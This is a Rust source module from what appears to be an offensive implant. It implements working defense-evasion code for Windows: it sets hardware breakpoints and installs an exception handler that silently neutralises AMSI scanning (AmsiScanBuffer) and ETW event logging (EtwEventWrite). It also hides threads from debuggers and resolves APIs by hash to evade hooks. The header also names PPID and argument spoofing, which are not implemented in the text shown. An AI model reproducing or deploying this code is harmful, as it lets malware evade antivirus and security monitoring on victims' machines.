//! Evasion mechanisms including HWBP-based AMSI/ETW bypass, PPID spoofing, argument spoofing, and callback execution.
//!
//! # Operation
//! - HWBP AMSI/ETW Bypass: Uses thread context hardware debug registers (Dr0-Dr3) to intercept execution at AMSI/ETW boundaries.
//! - PPID Spoofing: Manipulates thread attributes during process creation to masquerade the parent process.
//! - Argument Spoofing: Modifies the PEB command line at runtime.
//!
//! # Required Privileges
//! Standard user privileges are generally sufficient, though certain target processes for PPID spoofing may require SeDebugPrivilege.
//!
//! # Compatibility
//! Windows 10+ only (relies on specific offsets and newer thread context manipulation APIs).

#[cfg(windows)]
use std::sync::atomic::{AtomicUsize, Ordering};

#[cfg(windows)]
static AMSI_ADDR: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static ETW_ADDR: AtomicUsize = AtomicUsize::new(0);

#[cfg(windows)]
unsafe extern "system" fn veh_handler(
    exception_info: *mut winapi::um::winnt::EXCEPTION_POINTERS,
) -> i32 {
    let record = (*exception_info).ExceptionRecord;
    let context = (*exception_info).ContextRecord;

    if (*record).ExceptionCode == winapi::um::winnt::STATUS_SINGLE_STEP {
        let rip = (*context).Rip as usize;
        let amsi = AMSI_ADDR.load(Ordering::Relaxed);
        let etw = ETW_ADDR.load(Ordering::Relaxed);

        if (amsi != 0 && rip == amsi) || (etw != 0 && rip == etw) {
            // Bypass by clearing RAX (returning 0) and advancing RIP to a ret instruction
            (*context).Rax = 0;

            // Use NtClose as a known, small syscall stub to safely find a 'ret' (0xC3)
            // gadget without hitting false positives in complex instructions.
            let mut ptr = rip as *const u8; // Fallback to current rip if resolving fails
            let ntdll: *mut winapi::ctypes::c_void =
                pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as _;
            if !ntdll.is_null() {
                let nt_close: *mut winapi::ctypes::c_void =
                    pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_NTCLOSE)
                        .unwrap_or(0) as _;
                if !nt_close.is_null() {
                    let p = nt_close as *const u8;
                    // Check if NtClose starts with E9 (jmp), which typically indicates an EDR hook
                    if *p != 0xE9 {
                        ptr = p;
                    }
                }
            }

            for _ in 0..32 {
                if *ptr == 0xC3 || *ptr == 0xC2 {
                    break;
                }
                ptr = ptr.add(1);
            }
            (*context).Rip = ptr as u64;

            return winapi::vc::excpt::EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    winapi::vc::excpt::EXCEPTION_CONTINUE_SEARCH
}

#[cfg(windows)]
pub unsafe fn setup_hardware_breakpoints() {
    use winapi::um::errhandlingapi::AddVectoredExceptionHandler;
    use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
    use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
    use winapi::um::processthreadsapi::{
        GetCurrentProcessId, GetThreadContext, OpenThread, ResumeThread, SetThreadContext,
        SuspendThread,
    };
    use winapi::um::tlhelp32::{
        CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
    };
    use winapi::um::winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS, THREAD_ALL_ACCESS};

    let mut configured = false;

    let amsi: *mut winapi::ctypes::c_void =
        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_AMSI_DLL).unwrap_or(0) as *mut _;
    if !amsi.is_null() {
        let addr: *mut winapi::ctypes::c_void =
            pe_resolve::get_proc_address_by_hash(amsi as usize, pe_resolve::HASH_AMSISCANBUFFER)
                .unwrap_or(0) as *mut _;
        if !addr.is_null() {
            AMSI_ADDR.store(addr as usize, Ordering::Relaxed);
            configured = true;
        }
    }

    let ntdll: *mut winapi::ctypes::c_void =
        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as *mut _;
    if !ntdll.is_null() {
        let addr: *mut winapi::ctypes::c_void =
            pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_ETWEVENTWRITE)
                .unwrap_or(0) as *mut _;
        if !addr.is_null() {
            ETW_ADDR.store(addr as usize, Ordering::Relaxed);
            configured = true;
        }
    }

    if !configured {
        return;
    }

    // Register our VEH first
    AddVectoredExceptionHandler(1, Some(veh_handler));

    // Propagate hardware breakpoints to all existing threads in the process
    let pid = GetCurrentProcessId();
    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if snapshot != INVALID_HANDLE_VALUE {
        let mut te32: THREADENTRY32 = std::mem::zeroed();
        te32.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;

        if Thread32First(snapshot, &mut te32) != 0 {
            loop {
                if te32.th32OwnerProcessID == pid {
                    let h_thread = OpenThread(THREAD_ALL_ACCESS, 0, te32.th32ThreadID);
                    if !h_thread.is_null() {
                        SuspendThread(h_thread);

                        let mut ctx: CONTEXT = std::mem::zeroed();
                        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
                        if GetThreadContext(h_thread, &mut ctx) != 0 {
                            ctx.Dr0 = AMSI_ADDR.load(Ordering::Relaxed) as u64;
                            ctx.Dr1 = ETW_ADDR.load(Ordering::Relaxed) as u64;
                            // Enable local breakpoints for Dr0 (bit 0) and Dr1 (bit 2)
                            ctx.Dr7 |= (1 << 0) | (1 << 2);
                            SetThreadContext(h_thread, &ctx);
                        }

                        ResumeThread(h_thread);
                        CloseHandle(h_thread);
                    }
                }
                if Thread32Next(snapshot, &mut te32) == 0 {
                    break;
                }
            }
        }
        CloseHandle(snapshot);
    }
}

// Backward compatibility for existing patch functions in lib.rs
#[cfg(windows)]
pub unsafe fn patch_amsi() {
    setup_hardware_breakpoints();
}

#[cfg(not(windows))]
/// # Safety
///
/// No-op stub on non-Windows; always safe to call.
pub unsafe fn patch_amsi() {}

#[cfg(windows)]
pub fn hide_current_thread() {
    unsafe {
        let ntdll: *mut winapi::ctypes::c_void =
            pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as _;
        if !ntdll.is_null() {
            let func: *mut winapi::ctypes::c_void = pe_resolve::get_proc_address_by_hash(
                ntdll as usize,
                pe_resolve::HASH_NTSETINFORMATIONTHREAD,
            )
            .unwrap_or(0) as _;
            if !func.is_null() {
                let nt_set_info_thread: extern "system" fn(
                    winapi::um::winnt::HANDLE,
                    u32,
                    *mut winapi::ctypes::c_void,
                    u32,
                ) -> i32 = std::mem::transmute(func);
                nt_set_info_thread(
                    -2isize as winapi::um::winnt::HANDLE, // GetCurrentThread()
                    0x11,                                 // ThreadHideFromDebugger
                    std::ptr::null_mut(),
                    0,
                );
            }
        }
    }
}

#[cfg(not(windows))]
pub fn hide_current_thread() {}

/// Apply hardware breakpoints for AMSI/ETW bypass to the *calling* thread.
/// Called automatically by [`spawn_hidden_thread`]; call this at the start of
/// any other thread that must also be covered by the HWBP bypass.
#[cfg(windows)]
pub unsafe fn apply_hwbp_to_current_thread() {
    use winapi::um::processthreadsapi::{GetCurrentThread, GetThreadContext, SetThreadContext};
    use winapi::um::winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS};

    let amsi = AMSI_ADDR.load(Ordering::Relaxed);
    let etw = ETW_ADDR.load(Ordering::Relaxed);
    if amsi == 0 && etw == 0 {
        return; // HWBPs not yet configured; skip silently
    }

    let mut ctx: CONTEXT = std::mem::zeroed();
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    let h = GetCurrentThread();
    if GetThreadContext(h, &mut ctx) != 0 {
        ctx.Dr0 = amsi as u64;
        ctx.Dr1 = etw as u64;
        ctx.Dr7 |= (1 << 0) | (1 << 2); // enable local breakpoints for Dr0 and Dr1
        SetThreadContext(h, &ctx);
    }
}

pub fn spawn_hidden_thread<F, T>(f: F) -> std::thread::JoinHandle<T>
where
    F: FnOnce() -> T + Send + 'static,
    T: Send + 'static,
{
    std::thread::spawn(move || {
        #[cfg(windows)]
        unsafe {
            apply_hwbp_to_current_thread();
        }
        hide_current_thread();
        f()
    })
}
